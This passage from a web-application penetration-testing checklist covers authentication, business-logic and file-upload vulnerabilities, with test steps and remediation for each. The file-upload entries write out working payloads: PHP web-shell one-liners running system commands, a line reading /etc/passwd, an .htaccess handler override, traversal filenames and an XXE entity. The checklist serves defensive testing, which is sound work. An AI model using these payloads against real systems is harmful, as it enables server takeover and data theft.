**Key observations to record:** whether unlimited attempts are possible, lockout policy, rate limits, response differences.

**Remediation:**

- Implement strict, IP-based user rate limiting with CAPTCHA after a threshold is reached.
- Prevent attackers from manipulating their apparent IP (X-Forwarded-For etc.).
- Enforce strong passwords via a strength checker (e.g. zxcvbn) rather than rigid, predictable policies.
- Force HTTPS everywhere; redirect HTTP to HTTPS (enforce with HSTS).
- Consider account lockout + user rate limiting together; keep responses/timing/status codes identical for valid vs invalid usernames.

---

### VUL-AUTH-0002 — Username enumeration

**Severity:** Medium
**Status:** PENDING
**Category:** Authentication

**Description:** An attacker can determine whether a username is valid by observing differences in the application's behavior. This typically occurs on login pages (valid username + wrong password) or registration forms (username already taken) and massively speeds up later brute-force attacks.

**Test Steps:**

1. Submit a known-invalid username and a valid username (use your own account) with an incorrect password. Compare:
    - **Status codes** — different code for valid vs invalid indicates enumeration.
    - **Error messages** — different text (even one character) is a finding.
    - **Response times** — valid usernames may trigger the password check, causing measurable delay (amplify with an abnormally long password).
2. On registration, register an existing username vs a fresh one and compare responses.
3. Check HTTP responses / publicly accessible profiles for disclosed usernames or email addresses (incl. admin/IT-support addresses).
4. Check account-lock responses for enumeration (locked vs wrong-password messages).

**Root cause to check in code:** conditional error messages, per-username logic branches, timing differences when password is only checked for valid users.

**Remediation:**

- Return identical, generic error messages for all outcomes (and confirm byte-identical).
- Always return the same HTTP status code for every login outcome.
- Make response times indistinguishable across valid/invalid usernames.
- Audit website for any disclosure of usernames/emails in HTTP responses or public profiles.

---

### VUL-AUTH-0003 — Flawed brute-force protection (IP block bypass)

**Severity:** High
**Status:** PENDING
**Category:** Authentication

**Description:** IP-based blocking can be bypassed with flawed logic. Common implementation errors allow attackers to reset the failure counter or spoof apparent IP (header injection), making blocks ineffective.

**Test Steps:**

1. Determine the block rule: trigger N failed logins and confirm IP is blocked.
2. Test whether the failed-attempt counter resets on a *successful* login — attempt a few wrong passwords, log in with your own credentials, then continue wrong guesses. If it resets, an attacker can inject their own successful login between guesses.
3. Test whether the block depends on a spoofable header such as `X-Forwarded-For`, `X-Real-IP`, etc. Vary the header value on each attempt and see if the block is bypassed.
4. Check whether "incredible" usernames/IPs produce different behavior unlocking a bypass.

**Remediation:**

- Perform strict, IP-based user rate limiting that ignores spoofable headers.
- Do not reset the failed-attempt counter on any successful login within the same rate-limit window.
- After the threshold, require a CAPTCHA on every further login attempt.
- Track attempts by actual source IP + account, not merely the account.

---

### VUL-AUTH-0004 — Account locking bypass

**Severity:** Medium
**Status:** PENDING
**Category:** Authentication

**Description:** Account locking after N failed attempts protects a single targeted account but fails against:

- Attacks trying to compromise *any* account (try ≤N passwords against every username).
- Credential stuffing attacks (each username tried once with a stolen genuine credential).

**Test Steps:**

1. Confirm the lockout threshold (number of failed attempts before lock) by trying against a test account.
2. Test the "low-and-slow password spraying" approach: pick ≤3 passwords and try them against many usernames — confirm no account lock triggers.
3. Test credential stuffing: use a small dictionary of known breach username:password pairs; confirm each username is only attempted once (no lockout).
4. Check whether account-lock responses themselves leak which usernames are valid (enumeration vector).

**Remediation:**

- Combine account locking with user rate limiting (IP-based) so password spraying is also disrupted.
- Keep lockout responses identical to generic login failures.
- Detect and block credential-stuffing patterns (many distinct usernames from one source).

---

### VUL-AUTH-0005 — User rate limiting bypass

**Severity:** Medium
**Status:** PENDING
**Category:** Authentication

**Description:** Rate limiting restricts requests from an IP within a time window. Bypasses exist when:

- The attacker can manipulate their apparent IP (header spoofing).
- Multiple passwords can be tested within a single HTTP request (e.g. array/JSON payload) so one request "counts" once.

**Test Steps:**

1. Confirm the rate limit threshold (requests before block) and unblock mechanism (auto after time, manual, or CAPTCHA).
2. Test spoofable headers (`X-Forwarded-For`, etc.): change the value between attempts and observe whether the limit resets.
3. Test multi-value parameters: send a request where a parameter accepts an array/CSV/JSON list of passwords, e.g. `username=carlos&password[]=pass1&password[]=pass2...`. If the server iterates all values, one request = many password guesses.
4. Reproduce the multi-password request with the effective credentials validated across the list.

**Remediation:**

- Derive limiting from the actual source IP; do not trust forwarded headers from clients.
- Validate parameter types strictly (reject arrays/lists where a scalar is expected).
- Enforce per-account AND per-IP limits simultaneously.

---

### VUL-AUTH-0006 — HTTP basic authentication weaknesses

**Severity:** Medium
**Status:** PENDING
**Category:** Authentication

**Description:** HTTP basic auth sends `Authorization: Basic base64(username:password)` on every request. It repeatedly transmits credentials (MITM exposure unless HSTS is enforced), often lacks brute-force protection, and offers no CSRF protection. Exposed credentials may be reused elsewhere.

**Test Steps:**

1. Locate areas protected by HTTP basic auth.
2. Confirm whether the base64 token is static and sent on every request.
3. Check whether the site sets/enforces HSTS (`Strict-Transport-Security` header).
4. Attempt brute-force of the token with password wordlists — note if any rate limiting applies (usually none).
5. Verify whether CSRF-style attacks would affect any functionality behind basic auth.

**Remediation:**

- Replace HTTP basic auth with a modern session/token-based authentication over HTTPS.
- Enforce HTTPS with HSTS to protect credentials in transit.
- If basic auth must remain, apply brute-force protection and rate limiting.
- Ensure any credentials thus exposed are unique (not reused in other contexts).

---

### VUL-AUTH-0007 — 2FA simple bypass

**Severity:** High
**Status:** PENDING
**Category:** Authentication

**Description:** Some implementations put the user into a "logged in" state after step one (password) and never verify that step two (verification code) was completed. Directly navigating to post-login pages bypasses 2FA entirely.

**Test Steps:**

1. Log in with a test account's password (step 1) but do NOT complete the code step.
2. Directly request protected (logged-in-only) URLs.
3. If a protected page loads without the second factor, 2FA is bypassable.
4. Also test direct `GET /login-steps/second` and subsequent page navigation without a code.

**Remediation:**

- Do not grant any privileged state until ALL authentication steps are complete.
- Server-side, enforce that the second step is completed before serving authenticated content ("state machine" that cannot be skipped).

---

### VUL-AUTH-0008 — Flawed 2FA verification logic

**Severity:** Critical
**Status:** PENDING
**Category:** Authentication

**Description:** Verification codes are tied to the account via a client-controlled cookie/parameter rather than server state. Example flow:

```
POST /login-steps/first   (username=carlos&password=qwerty)
Set-Cookie: account=carlos
POST /login-steps/second  (Cookie: account=carlos, verification-code=123456)
```

Changing the cookie/parameter to another username when submitting the code lets an attacker authenticate as that user without their password.

**Test Steps:**

1. Log in with your own credentials and reach the verify-code step.
2. Capture the request and the account identifier (cookie, hidden field, or JSON/body field).
3. Change the account identifier to a victim username you know (do not change the code).
4. If the account is then verified as the victim, the logic is flawed.
5. Also test: completing step 2 first then step 1, replaying steps, missing parameters, etc.

**Remediation:**

- Bind the verification to the authenticated server-side session, never to client-supplied identifiers.
- Derive "which user" from the verified session token, not from cookies/params in the submit request.
- Triple-check verification/validation logic — a check that can be bypassed is no check at all.

---

### VUL-AUTH-0009 — Brute-forcing 2FA verification codes

**Severity:** High
**Status:** PENDING
**Category:** Authentication

**Description:** 2FA codes are often simple 4–6 digit numbers. If the code endpoint lacks rate limiting or the logout-on-error is trivially re-triggerable (automated multi-step macros), the code can be brute-forced — especially when combined with VUL-AUTH-0008 to target arbitrary users.

**Test Steps:**

1. Obtain a legitimate code request (test account).
2. Confirm there is no rate limit / CAPTCHA on code submission.
3. If auto-logout occurs after N errors, confirm the process is scriptable (login → code attempts → relogin) using an automation/macro approach.
4. Attempt systematic enumeration of the 4/6-digit space on a test account.

**Remediation:**

- Strictly rate-limit code verification attempts (per user and per IP) with CAPTCHA after threshold.
- Use high-entropy, time-limited codes.
- Invalidate codes after a small number of failed attempts and require re-authentication (with protection against automated re-login loops).
- Couple with server-side session binding (see VUL-AUTH-0008).

---

### VUL-AUTH-0010 — Weak "remember me" / stay-logged-in cookie

**Severity:** High
**Status:** PENDING
**Category:** Authentication

**Description:** Persistent "remember me" cookies that bypass login must be impractical to guess. If generated from predictable static values (username + timestamp, or even the password), an attacker with their own account can reverse-engineer the formula and forge other users' cookies.

**Test Steps:**

1. Enable "remember me" on a test account and capture the persistent cookie.
2. Inspect the cookie — check for base64/encoded values; decode to look for `username:timestamp` or `username:password` patterns.
3. If decodable, study how it is constructed; create a second account and confirm the formula generalizes.
4. If a predictable formula is confirmed, attempt to forge a victim user's cookie using the pattern.
5. If the cookie is hashed without salt, feed the hash into known password-hash lookup (see VUL-AUTH-0011).

**Remediation:**

- Generate high-entropy random "remember me" tokens stored server-side (sessions/session-store), not derivable-by-formula.
- Never embed passwords (even hashed) in cookies.
- Use per-user salts if any hashing is involved.
- Do NOT rely on "encryption" via base64/two-way encoding — it offers no protection.

---

### VUL-AUTH-0011 — Offline password cracking from cookies

**Severity:** High
**Status:** PENDING
**Category:** Authentication

**Description:** If a "remember me" cookie contains a hashed password (unsalted with a known algorithm), the hash can be cracked offline against wordlists/rainbow tables — bypassing login attempt limits entirely, since no server request is needed.

**Test Steps:**

1. Capture a test user's "remember me" cookie (as in VUL-AUTH-0010).
2. Identify the encoding/hashing algorithm (base64 wrappers, hash length formats).
3. Take the hash offline and run a cracking tool against common password wordlists.
4. If the plaintext password is recovered, submit it to login to confirm.

**Remediation:**

- Use random server-side tokens; never place password hashes in client cookies.
- If a password-derived value is required at all, use a salted, slow KDF (bcrypt/argon2/scrypt) with a per-user unique salt.
- Rotate tokens and expire them.

---

### VUL-AUTH-0012 — Password reset broken logic

**Severity:** Critical
**Status:** PENDING
**Category:** Authentication

**Description:** Password reset is inherently dangerous. Common flaws:

- Reset URL embeds the username: `reset-password?user=victim-user` — attacker changes the user parameter and resets an arbitrary account.
- Token not re-validated on form submission — attacker uses their own token, deletes it, and resets any user's password via the reset form.

**Test Steps:**

1. Trigger a password reset for a test account and inspect the reset URL/parameters.
2. If the URL identifies the account by username/userID parameter, change it to another user and confirm you reach a reset page for them.
3. If a token is used: start a reset from your own account, delete the token from the submitted reset request, and check whether the new password is still applied — confirm whether the token is re-validated server-side on submit.
4. Verify the token is high-entropy/random, time-limited, single-use, and destroyed after use.

**Remediation:**

- Use high-entropy, unpredictable, expiring, single-use tokens; the URL must not reveal the target username.
- On submission, re-validate the token against the session and confirm which user it is bound to.
- Destroy tokens immediately after successful reset (and on expiry).
- Never send current passwords by email; avoid persistent passwords over insecure channels.

---

### VUL-AUTH-0013 — Password reset poisoning (via middleware)

**Severity:** High
**Status:** PENDING
**Category:** Authentication

**Description:** If the reset-email URL is generated dynamically from request-controlled host headers or reverse-proxy headers, an attacker can poison the link so the reset token is delivered to a server they control, then use it to reset the victim's password.

**Test Steps:**

1. Trigger a password reset and intercept the reset-email generation (or a generic "reset link" to your own mailbox).
2. Modify request-controlled headers used to build the link — e.g. `Host`, `X-Forwarded-Host`, `X-Forwarded-Proto`, `Forwarded` — to point at a server you control (a listening/collector endpoint).
3. Check whether the generated link in the target's email uses the poisoned host.
4. If the victim receives a link to the attacker-controlled host, the reset token is stealable → full account takeover.

**Remediation:**

- Build reset URLs from the canonical server-side host configuration, NEVER from client-supplied Host/proxy headers.
- Whitelist/validate allowed hosts and reflect only the configured hostname.
- Re-validate the host on submission and use the same host for subsequent redirects.

---

### VUL-AUTH-0014 — Password brute-force via password change

**Severity:** High
**Status:** PENDING
**Category:** Authentication

**Description:** Password-change pages check current-password + username matching like a login page, so they can be abused for username enumeration and password brute-force — especially if the username is supplied in a hidden/editable field and the page can be reached without being logged in as the target.

**Test Steps:**

1. Locate the password change function and inspect all parameters (including hidden fields like username).
2. Test whether the change function can be accessed without being authenticated as the target user.
3. If a hidden username field exists, mutate its value to other users and observe error differences (enumeration + brute-force leverage).
4. If both current-password and username must match, use techniques to brute-force the current password with timing/error differences.

**Remediation:**

- Require re-authentication (session-scoped) for password changes; never trust client-supplied username for the account being changed.
- Apply the same brute-force protections as the main login (rate limiting, identical responses, enumeration-safe errors).
- Treat password change/reset as first-class attack surface — apply equal protections.

---

## Authentication — General Remediation Principles (cross-cutting)

- **Take care with user credentials:** never send login data over unencrypted connections; enforce HTTPS and redirect HTTP → HTTPS (HSTS).
- **Don't count on users for security:** enforce passwords with a strength meter (e.g. zxcvbn), not predictable policies.
- **Prevent username enumeration:** identical generic errors, same status code, indistinguishable response times.
- **Implement robust brute-force protection:** strict IP-based rate limiting, CAPTCHA after threshold, resistant to header spoofing.
- **Triple-check verification logic:** any check that can be bypassed is no protection at all.
- **Don't forget supplementary functionality:** password reset/change are equal attack surfaces to the login page.
- **Implement proper MFA:** verify multiple *different* factors; prefer dedicated tokens/apps over SMS (SIM-swap risk); email codes = single factor in disguise. Bind 2FA to the server-side session.

---

# CATEGORY B: BUSINESS LOGIC VULNERABILITIES

## Background

Business logic vulnerabilities are flaws in the design/implementation that allow an attacker to elicit unintended behavior, generally by failing to anticipate and safely handle unusual application states. They result from **flawed assumptions about how users will interact with the app** and weak/inconsistent validation of server-side state.

**Impact:** highly variable — from trivia to complete authentication bypass, privilege escalation, and financial fraud (stolen funds). Any quirky logic should be fixed even if exploitability isn't obvious.

**Root causes to hunt for:**

- Excessive trust in client-side controls.
- Failure to handle unconventional input.
- Flawed assumptions about user behavior (trust, mandatory input, sequence).
- Domain-specific flaws (transactions, discounts).
- Encryption oracles.
- Email address parser discrepancies.

---

### VUL-BL-0001 — Excessive trust in client-side controls

**Severity:** High
**Status:** PENDING
**Category:** Business Logic

**Description:** The app assumes users only interact via the web UI and that client-side validation is reliable. An attacker tampers with data in transit (intercepting proxy) after the browser sends it but before server-side logic processes it, bypassing all client controls.

**Test Steps:**

1. Intercept every form submission and examine hidden/price/quantity/step values delivered from the client.
2. Alter values after client-side validation passes — e.g. price, quantity, discount codes, IDs, role flags, totals.
3. Submit tampered values and observe whether server-side accepts them without re-validation.
4. Test all functions: order, payment, transfers, coupon, admin toggles, etc.

**Remediation:**

- Treat all client-supplied data as untrusted; validate AND re-validate server-side.
- Perform integrity checks on transaction-critical values (prices/formulas derived server-side, never from client).
- Never persist security decisions/roles/totals sent by the client.

---

### VUL-BL-0002 — Failing to handle unconventional input

**Severity:** High
**Status:** PENDING
**Category:** Business Logic

**Description:** The application doesn't safely handle out-of-range/unexpected inputs. Example: funds transfer checks `amount <= balance` but allows negative amounts, so `-1000` passes the check and reverses the transfer direction.

**Test Steps:**

1. For every numeric input, submit: extremely high values, extremely low (negative) values, zero, and values spanning type boundaries.
2. For text fields, submit abnormally long strings and unusual data types.
3. Remove/replace parameters one at a time, including deleting the parameter name, and observe behavior (see VUL-BL-0004).
4. Reverse-engineer limits: what limitations exist, what happens at the limit, what transforms/normalize input.
5. If one form is weak, assume siblings are too — test all forms.

**Remediation:**

- Enforce explicit server-side validation of value ranges/sanity before business logic runs.
- Reject negative/zero/oversized values where the domain forbids them.
- Handle every case explicitly — behavior for unanticipated input must be "reject", never undefined.

---

### VUL-BL-0003 — Inconsistent security controls (trusted users no longer trustworthy)

**Severity:** Medium
**Status:** PENDING
**Category:** Business Logic

**Description:** Controls applied during registration/setup are relaxed for users once they've passed initial gates, assuming they remain trustworthy. Inconsistent enforcement later creates exploitable loopholes.

**Test Steps:**

1. Complete early-stage security/validation steps, then observe whether later steps/endpoints enforce the same rules.
2. Test flows where a user's data is trusted after initial checks: changing emails, roles, prices, quantities, coupon use, etc.
3. Compare enforcement in first-time action vs subsequent actions of the same type.

**Remediation:**

- Apply security controls consistently at EVERY step of the workflow.
- Do not assume prior validation carries forward; re-validate on each state transition.

---

### VUL-BL-0004 — Users not supplying mandatory input

**Severity:** Medium
**Status:** PENDING
**Category:** Business Logic

**Description:** The app expects required parameters to always exist. Removing a required parameter (or its name) can route execution to unintended code paths, especially when one script serves multiple functions gated by parameter presence.

**Test Steps:**

1. Remove ONE parameter at a time (value first, then the whole name) and observe the effect.
2. Ensure all code paths are reached by only removing one parameter per test.
3. Follow multi-stage workflows to completion after tampering — a change in step 1 often affects a later step.
4. Test URL params, POST params, AND cookies.
5. Watch for debug output, stack traces, and error messages revealing internals (information disclosure).

**Remediation:**

- Validate the complete set of expected parameters before executing logic.
- Disambiguate functions by explicit action/step fields, not by parameter presence alone.
- Centralize exception handling — never surface debug/stack details to clients.

---

### VUL-BL-0005 — Users not following the intended sequence

**Severity:** High
**Status:** PENDING
**Category:** Business Logic

**Description:** Multi-step workflows assume users follow the intended order and complete the sequence. Attackers use forced browsing / request replay to skip steps, repeat steps, or access steps out of order, leaving the app in an inconsistent state.

**Test Steps:**

1. For each multi-step workflow, enumerate the steps and how each is reached (URL vs parameter-set).
2. Skip steps, access a single step multiple times, return to earlier steps, and re-order requests.
3. Attempt to access "later step" resources before completing "earlier step" conditions (e.g. checkout without cart, verify without login).
4. Note response/exception details — state errors frequently leak internals and reveal how the app tracks state.

**Remediation:**

- Enforce workflow state server-side (ordering, completion, single-completion) with a proper state machine.
- Reject out-of-order/duplicate steps gracefully with generic errors (no debug output).

---

### VUL-BL-0006 — Domain-specific flaws (transactions, discounts, pricing)

**Severity:** High
**Status:** PENDING
**Category:** Business Logic

**Description:** Flaws tied to the business domain — typically money logic: discounts applied based on criteria evaluated at the wrong time, cart modifications after discount computation, funding thresholds, quantity logic, inventory, etc. Example: order over $1000 gets 10% discount; attacker hits threshold, removes items, keeps the discount.

**Test Steps:**

1. Map the money flows: pricing, discounts, coupons, refunds, cart totals, taxes, shipping.
2. Change cart contents AFTER a discount/threshold is computed and before order placement; confirm discount persists.
3. Test quantity logic: negative, zero, huge, fractional quantities; inventory deductions.
4. Manipulate payment/order amounts and see which server-side recomputation (if any) occurs.
5. Look for price adjustments based on user actions and identify at WHAT point they are evaluated vs applied.

**Remediation:**

- Recompute totals, discounts, and entitlements server-side at the FINAL step of the transaction.
- Validate against server-stored reference data, never accept client-supplied totals.
- Add invariant checks (e.g. discounted price cannot be below actual item cost; quantity between 1 and stock).

---

### VUL-BL-0007 — Encryption oracle

**Severity:** High
**Status:** PENDING
**Category:** Business Logic

**Description:** A user-controllable input is encrypted and the ciphertext is returned/made available to the user. The user can then feed arbitrarily generated ciphertext into OTHER inputs that expect data encrypted with the same algorithm — forging valid inputs for sensitive functions. A paired decrypt endpoint compounds the risk.

**Test Steps:**

1. Identify any function that encrypts user input and exposes the ciphertext.
2. Identify other inputs/functions that expect the same-format/algorithm ciphertext.
3. Generate ciphertext via the oracle and pass it into those functions; observe if it's accepted/decrypted.
4. If a reverse (decrypt) input exists, use it to learn the expected plaintext structure and craft malicious payloads.

**Remediation:**

- Don't let user-controlled plaintext be encrypted and returned as usable ciphertext for sensitive flows.
- Bind encrypted values to server-side sessions/context (authenticity+integrity), not freely portable ciphertext.
- Authenticate encrypted data and separate signing/encryption keys used by different functions.

---

### VUL-BL-0008 — Email address parser discrepancies

**Severity:** High
**Status:** PENDING
**Category:** Business Logic

**Description:** The app parses email addresses to derive domains/organizations, but different components parse differently. Attackers use encoding/disguise tricks so an address passes initial validation but is interpreted differently by later parsing logic — enabling registration under restricted/privileged domains (admin panels, restricted functions).

**Test Steps:**

1. Identify validation rules on email (registration, admin user creation, domain gating).
2. Test parser discrepancies with encodings: case, `+` tags, comments `( )`, dot variations, quoted local parts, IDN/UTF-8 domains, trailing dots, whitespace, multiple `@`.
3. For each candidate, compare what the validation parser sees vs what the downstream server parser uses.
4. Confirm whether an account created with a parsed-discrepancy address gains restricted access.

**Remediation:**

- Normalize and parse email addresses through ONE agreed parser/handler across the whole application (single source of truth).
- Reject (or canonicalize) known ambiguous encodings before domain-based decisions.
- Authorize by verified server-side identity (email verification link) rather than parsed domain claims.

---

## Business Logic — General Remediation Principles (cross-cutting)

- Ensure developers and testers understand the business domain.
- Avoid implicit assumptions about user behavior or other components' behavior.
- Identify assumptions about server-side state and verify them — sanity-check all input before proceeding.
- Maintain clear design documents / data flows for all transactions, noting assumptions at each stage.
- Write clear code; document complex paths; note side-effects of dependencies if manipulated maliciously.
- When a logic flaw is found, analyze WHY it existed and how it was missed — fix process + code.

---

# CATEGORY C: FILE UPLOAD VULNERABILITIES

## Background

File upload vulnerabilities occur when a web server allows users to upload files to its filesystem without sufficiently validating their **name, type, contents, or size**. A basic image upload function can be abused to upload arbitrary/dangerous files — including server-side scripts enabling **remote code execution (RCE)** via a web shell.

**Impact depends on:**

- Which aspect of the file validation is flawed (size, type, contents, name).
- What restrictions apply after the upload (execution policy per directory).

**Worst case:** type not validated + server executes `.php`/`.jsp` → attacker uploads a web shell → full control over the server (read/write arbitrary files, exfiltrate data, pivot into internal infrastructure).

**Other impacts:** filename/path flaws → overwrite critical files or upload to unanticipated locations (path traversal); missing size limits → disk-fill DoS.

**Root causes:** blacklist-based (not whitelist) validation with parser discrepancies; trusting client-supplied properties (Content-Type, filename) instead of validating file contents; inconsistent enforcement across hosts/directories.

**How servers handle static files:** the server parses the request path extension → maps to a MIME type. Executable types are scripted (parameters processed first). Misconfigured servers may serve script source as plain text (source leakage). Directory-level configuration (`AllowOverride` Apache `.htaccess`, IIS `web.config`) may override global settings — if you can upload these, you can map a custom extension to an executable MIME type and bypass blacklists.

---

### VUL-FU-0001 — Unrestricted file upload → web shell (RCE)

**Severity:** Critical
**Status:** PENDING
**Category:** File Upload

**Description:** The upload function has no/ineffective validation and the server is configured to execute server-side scripts (PHP, Java, Python, JSP...). Uploading a web shell grants full control over the server.

**Test Steps:**

1. Locate every file upload function (avatars, attachments, documents, bulk import, etc.).
2. Attempt to upload a web shell, e.g. PHP one-liners:
    - `<?php echo file_get_contents('/etc/passwd'); ?>`
    - `<?php echo system($_GET['command']); ?>`
3. Note the URL where the uploaded file is stored.
4. Request the uploaded file; if it executes, RCE is confirmed (e.g. `GET /uploads/exploit.php?command=id`).
5. Validate arbitrary file read and command execution both fire.

**Remediation:**

- Whitelist permitted extensions (never blacklist alone).
- Never serve user-uploaded files from an executable directory; disable script execution in upload directories (e.g. `php_admin_flag engine off`, no `AddType`/`AddHandler`).
- Rename files (random names, safe extension) and store outside web root when possible.
- Validate file contents, not just names/content-types; use established framework handling.

---

### VUL-FU-0002 — Flawed file type validation (Content-Type trust)

**Severity:** High
**Status:** PENDING
**Category:** File Upload

**Description:** The server validates uploads by checking the client-supplied `Content-Type` MIME header (e.g. only allowing `image/jpeg`, `image/png`) and implicitly trusts it. An attacker changes the header value via an intercepting proxy while keeping malicious file contents.

**Test Steps:**

1. Intercept an upload request (`multipart/form-data`).
2. Change the part's `Content-Type` to an allowed value (e.g. `image/jpeg`) while keeping a PHP shell in the body.
3. Confirm the upload succeeds and the stored file executes when requested.
4. Test both the file part's `Content-Type` and the overall request `Content-Type`.

**Remediation:**

- Do NOT trust the client `Content-Type`. Verify the file's actual magic bytes/signature server-side (e.g. JPEG starts `FF D8 FF`).
- Combine signature checks with an extension whitelist and re-encoding for images.

---

### VUL-FU-0003 — Web shell upload via path traversal

**Severity:** High
**Status:** PENDING
**Category:** File Upload

**Description:** The filename (from `Content-Disposition: filename=`) is not sanitized and is incorporated into the filesystem path. Traversal sequences let the attacker write a script to a different directory that is *not* protected — a directory where user files were never expected and where execution is enabled.

**Test Steps:**

1. Upload a file with a traversal filename, e.g. `../../../../var/www/html/exploit.php`, or URL-encoded variants (`..%2f..%2f`).
2. Check whether the server stores it in the traversed location rather than the sandboxed upload dir.
3. Identify directories where script execution is enabled vs disabled (upload dirs are usually protected; other dirs may not be) and target those.
4. Request the stored path to confirm execution.

**Remediation:**

- Reject filenames containing `../`, `..\`, null bytes, absolute paths, or any directory delimiters (whitelist safe filename charset).
- Store uploads under a server-generated random name; never use the client filename for the filesystem path.
- Validate before writing to the permanent filesystem.

---

### VUL-FU-0004 — Extension blacklist bypass / server config override

**Severity:** High
**Status:** PENDING
**Category:** File Upload

**Description:** Blacklists of dangerous extensions (.php) are inherently incomplete and bypassable. Alternative executable extensions (`.php5`, `.shtml`, `.phtml`, `.asp`, `.jsp`, `.war`...) may be missed. Worse, if the upload function allows uploading server configuration files (Apache `.htaccess`, IIS `web.config`), the attacker can map a custom extension to an executable MIME type.

**Test Steps:**

1. Upload `.php` → confirm blocked. Retry with alternative executable extensions (`.php3`, `.php4`, `.php5`, `.phtml`, `.pht`, `.phar`, `.shtml`, `.asp`, `.aspx`, `.jsp`, `.jspx`, `.war`, `.cgi`), try double/trible extension as well .
2. If Apache: upload a `.htaccess` containing `AddType application/x-httpd-php .shell` then upload `shell.shell` containing PHP; request it.
3. If IIS: upload `web.config` with `<staticContent><mimeMap fileExtension=".json" .../></staticContent>` (or ASP handler mapping) then execute accordingly.
4. Try requesting `/uploads/.htaccess` to see whether server config files are fetchable.

**Remediation:**

- Whitelist allowed extensions (plus disallow `.htaccess`/`web.config`/`.config` explicitly even if uploaded).
- Block upload of any server configuration/named override files.
- Keep uploads out of any directory that honors per-directory config overrides, and disable script execution there.

---

### VUL-FU-0005 — Obfuscated file extensions

**Severity:** High
**Status:** PENDING
**Category:** File Upload

**Description:** Extension validation logic can be confused by obfuscation, letting malicious files past validation while the MIME-mapping/execution logic still treats them as executable.

**Test Steps:** Try each bypass and request the stored file to confirm execution:

1. Case variation: `exploit.pHp`, `Exploit.PhP`.
2. Multiple extensions: `exploit.php.jpg` — depends on the parsing algorithm (last/first extension).
3. Trailing characters: `exploit.php.`, `exploit.php` , `exploit.php%20`.
4. URL/double-encoding of dots and slashes: `exploit%2Ephp`, `exploit%252Ephp`.
5. Semicolons or null bytes before extension: `exploit.asp;.jpg`, `exploit.asp%00.jpg`.
6. Multibyte/Unicode sequences that normalize to dots/null: `xC0 x2E`, `xC4 xAE`, `xC0 xAE`.
7. Non-recursive stripping: if `.php` is stripped once, use `exploit.p.phphp` (stripping leaves `exploit.php`).

**Remediation:**

- Parse the filename with one canonical algorithm: strip path components and possibly-peculiar chars, take the FINAL meaningful extension from a single, consistent parser.
- Apply a strict whitelist AFTER canonicalization/normalization; reject control/null bytes entirely.
- Do not rely on string-stripping transformations for defense.

---

### VUL-FU-0006 — Polyglot files / flawed content validation

**Severity:** High
**Status:** PENDING
**Category:** File Upload

**Description:** The server improves validation by checking intrinsic file properties (image dimensions) or magic-byte signatures. This is more robust but still bypassable — tools like ExifTool can embed malicious code in image metadata to create a polyglot file that is both a valid image and a valid script/template for the engine in use.

**Test Steps:**

1. Confirm the content-based validation (dimensions, magic bytes).
2. Craft a polyglot: embed a script payload in comment/metadata section of a valid image (e.g. JPEG with `<?php system($_GET['cmd']); ?>` in a comment block, or exiftool `Comment` injection).
3. Upload the polyglot with a permitted (or obfuscated) extension.
4. Request it to trigger execution by the script engine if the server parses the file in an exploitable way.

**Remediation:**

- Validate with a whitelist, then **re-process/normalize** content (re-encode images via a clean image library — strips embedded payloads).
- Serve uploads with `Content-Disposition` and non-executable handling; disable script execution in upload dirs.
- Store with randomized extension/name so file-format parsers dictate handling, not the attacker's filename.

---

### VUL-FU-0007 — File upload race conditions

**Severity:** Medium
**Status:** PENDING
**Category:** File Upload

**Description:** Some uploads write the file directly to the main filesystem and delete it if it fails validation (common with AV-checking flows). A web shell exists for the validation window and can be executed anyway. URL-based uploads fetch remote content then validate — the temporary-file window and guessable temp names (e.g. `uniqid()`) can be brute-forced.

**Test Steps:**

1. Upload a file with an invalid/malicious extension and observe whether it is first written then removed (timing/behavior).
2. Concurrently send repeated requests for the file path during the processing window to trigger execution before deletion (race).
3. For URL-based upload: point the URL to a controlled server; serve a large file whose head is the malicious payload + huge padding to slow processing.
4. Brute-force temporary directory/file names (if random via `uniqid()`) while the file exists.

**Remediation:**

- Stage uploads in a random, sandboxed, non-executable temp directory; validate fully BEFORE any move to destination.
- Never execute before validation; restrict execution on any user-writable path.
- Use cryptographic randomness for temp names; avoid timing-window attacks by validating at write time (buffer then verify).

---

### VUL-FU-0008 — Malicious client-side scripts via upload (stored XSS)

**Severity:** Medium
**Status:** PENDING
**Category:** File Upload

**Description:** Even without RCE, uploading HTML/SVG files containing `<script>` tags creates stored XSS if other users view the uploaded file from the same origin.

**Test Steps:**

1. Upload an HTML or SVG file containing a `<script>` payload.
2. Load the uploaded file in a browser and confirm the script executes (same-origin — the file must be served from the same origin you upload to).
3. Check whether the file is rendered inline as HTML/SVG to other users (Content-Type served as `text/html`, `image/svg+xml`).
4. Test for other renderable formats that preserve scripts.

**Remediation:**

- Serve uploads with `Content-Disposition: attachment; filename=...` (forces download, not inline render) and safe `X-Content-Type-Options: nosniff`.
- Strip scripts/active content from HTML/SVG; for images, re-encode.
- Restrict allowed text-like formats.

---

### VUL-FU-0009 — XXE via parsed file formats

**Severity:** Medium
**Status:** PENDING
**Category:** File Upload

**Description:** If uploaded files are later parsed (e.g. DOC/DOCX/XLSX/XML uploaded then processed), the parser may be vulnerable to XXE — reading local files or triggering SSRF via internal/external entities, in addition to the stored-file risks.

**Test Steps:**

1. Identify upload functions that parse documents after upload.
2. Upload an XML-based payload (or modify a DOCX/XLSX to include an XXE entity) e.g. `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`.
3. Observe whether parser output reflects file contents, triggers errors revealing data, or makes out-of-band requests (see SSRF category).

**Remediation:**

- Disable external entities and DTD processing in all XML/document parsers (XXE hardening).
- Validate file type server-side; reject XML-based formats not required.
- Reference the XXE cross-cutting guidance when added.

---

### VUL-FU-0010 — PUT-method file uploads

**Severity:** Medium
**Status:** PENDING
**Category:** File Upload

**Description:** Some servers are configured to accept `PUT` requests, allowing file creation even when no web upload function exists (`PUT /images/exploit.php`).

**Test Steps:**

1. Send `OPTIONS` to endpoints and look for allowed `PUT` (and `DELETE`) in `Allow`/`Access-Control-Allow-Methods`.
2. Send `PUT /<path>/exploit.php` with PHP content and `Content-Type: application/x-httpd-php`.
3. Request the path to confirm the file was written/executed.

**Remediation:**

- Disable `PUT`/`DELETE` (and generally all but `GET`/`POST` on user-facing servers) unless required.
- If required, apply the same validation/whitelist/execution controls as for form uploads.

---

## File Upload — General Remediation Principles (cross-cutting)

- **Whitelist extensions** (not blacklist) and **whitelist allowed keys/charset** in filenames.
- Block traversal sequences (`../`, `..\`), null bytes, absolute paths.
- **Randomize stored filenames** to avoid collisions/overwrite and to decouple the served name from attacker input.
